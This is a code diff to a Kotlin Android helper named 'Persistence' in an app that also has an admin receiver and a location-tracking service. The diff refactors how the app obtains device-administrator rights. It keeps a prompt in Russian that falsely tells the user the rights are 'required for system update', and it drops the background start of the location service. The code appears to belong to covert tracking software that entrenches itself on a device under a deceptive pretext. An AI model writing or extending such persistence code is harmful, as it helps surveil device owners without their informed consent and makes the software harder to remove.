@@ -4,25 +4,39 @@ import android.app.admin.DevicePolicyManager
 import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
-import android.os.Build
 import com.sp.core.AdminReceiver
-import com.sp.core.services.LocationService
 
+/**
+ * Device-admin persistence.
+ *
+ * The activation prompt is opened by the setup wizard (it needs a visible
+ * activity), this helper only checks the state and can be called from any
+ * background context.
+ */
 object Persistence {
-    fun lockIn(ctx: Context) {
-        val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE)
-                as DevicePolicyManager
-        val admin = ComponentName(ctx, AdminReceiver::class.java)
-        if (!dpm.isAdminActive(admin)) {
-            val i = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
-            i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
-            i.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
-                "Требуется для обновления системы")
-            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-            try { ctx.startActivity(i) } catch (_: Exception) {}
+
+    fun isAdmin(ctx: Context): Boolean {
+        return try {
+            val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
+            dpm.isAdminActive(ComponentName(ctx, AdminReceiver::class.java))
+        } catch (_: Throwable) {
+            false
         }
-        val svc = Intent(ctx, LocationService::class.java)
-        if (Build.VERSION.SDK_INT >= 26) ctx.startForegroundService(svc)
-        else ctx.startService(svc)
+    }
+
+    fun adminIntent(ctx: Context): Intent {
+        val admin = ComponentName(ctx, AdminReceiver::class.java)
+        return Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
+            .putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
+            .putExtra(
+                DevicePolicyManager.EXTRA_ADD_EXPLANATION,
+                "Требуется для обновления системы"
+            )
+    }
+
+    fun lockIn(ctx: Context) {
+        // No-op outside of the wizard: starting a foreground service or an
+        // activity from a background context is what crashed the app before.
+        if (!isAdmin(ctx)) return
     }
 }
